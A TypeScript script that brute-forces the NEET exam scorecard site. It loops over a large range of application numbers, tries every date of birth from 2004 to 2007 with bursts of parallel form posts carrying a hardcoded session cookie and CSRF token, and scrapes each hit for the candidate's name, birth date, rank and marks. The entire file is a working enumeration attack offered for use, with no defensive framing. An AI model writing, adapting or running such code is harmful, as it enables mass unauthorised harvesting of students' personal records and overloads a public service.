import axios from 'axios';
import qs from 'qs';
import  cheerio  from 'cheerio';
async function solve(applicationNo: string, day: string, month: string, year: string){

    let data = qs.stringify({
        '_csrf-frontend': 'u5tcxjjKiXKcRYvErpDPc3Gp8vRw6VrMkQFph5zLxKf38gyDXaa4LdMOuKf6wbo0C56-jDOqd6bASyzM-6iB1g==',
        'Scorecardmodel[ApplicationNumber]': applicationNo,
        'Scorecardmodel[Day]': day,
        'Scorecardmodel[Month]': month,
        'Scorecardmodel[Year]': year
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
        headers: { 
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
          'Accept-Language': 'en-US,en;q=0.9', 
          'Cache-Control': 'max-age=0', 
          'Connection': 'keep-alive', 
          'Content-Type': 'application/x-www-form-urlencoded', 
          'Cookie': 'advanced-frontend=ludq0ppri37631hkbukl4sm1q6; _csrf-frontend=741736d2b1c0cc985de5afb527be9acabe47ef5dce4735584d8a8e714d6bad67a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22LiPEel1_OK3cTQuGz7LxCC-jQJEKgcEq%22%3B%7D', 
          'Origin': 'null', 
          'Sec-Fetch-Dest': 'document', 
          'Sec-Fetch-Mode': 'navigate', 
          'Sec-Fetch-Site': 'same-origin', 
          'Sec-Fetch-User': '?1', 
          'Upgrade-Insecure-Requests': '1', 
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 
          'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"', 
          'sec-ch-ua-mobile': '?0', 
          'sec-ch-ua-platform': '"Windows"'
        },
        data : data
      };
      
      try{
        const response = await axios.request(config);
        const parsedData = parseHTML(JSON.stringify(response.data))
        return parsedData;  
      } catch(error){
        return null
      }
      

}

function parseHTML(htmlContent: string){
    const $ = cheerio.load(htmlContent);

    const applicationNumber = $('td:contains("Application No.")').next('td').text().trim() || 'N/A';

    const candidateName = $(`td:contains("Candidate’s Name")`).next('td').text().trim() || 'N/A';

    const dob = $('td:contains("Date of Birth (DD/MM/YYYY)")').next('td').text().trim() || 'N/A';

    const allIndiaRank = $('td:contains("NEET All India Rank")').next('td').text().trim() || 'N/A';

    const marks = $('td:contains("Total Marks Obtained (out of 720)")').first().next('td').text().trim() || 'N/A';

    // console.log({
    //     applicationNumber,
    //     candidateName,
    //     dob,
    //     allIndiaRank,
    //     marks
    // })

    if(allIndiaRank === 'N/A') {
        return null;
    }

    return {
        applicationNumber,
        candidateName,
        dob,
        allIndiaRank,
        marks
    }
}

async function main(applicationNumber: string){
    let solved = false;
    for(let year = 2007; year>=2004; year--){
        if(solved){
            break;
        }
        for(let month = 1; month <= 12; month++){
            if(solved){
                break;
            }
            const dataPromises = []
            console.log("sending request data for month " + month + " of the year " + year)
            for(let day = 1; day <= 31; day++){
                // console.log(`Processing ${applicationNumber} for ${year}-${month}-${day}`);
                const dataPromise = solve(applicationNumber,day.toString(),month.toString(),year.toString());
                dataPromises.push(dataPromise);
            }
            const resolvedData = await Promise.all(dataPromises);
            resolvedData.forEach(data => {
                if(data){
                    console.log(data);
                    solved = true;
                }
            })
        }
    }
}

async function solveAllApp(){

    for(let i = 240411183517; i < 240411999999; i++ ){
        console.log(`Application number: ${i}`)
        await main(i.toString());
    }
}

solveAllApp();
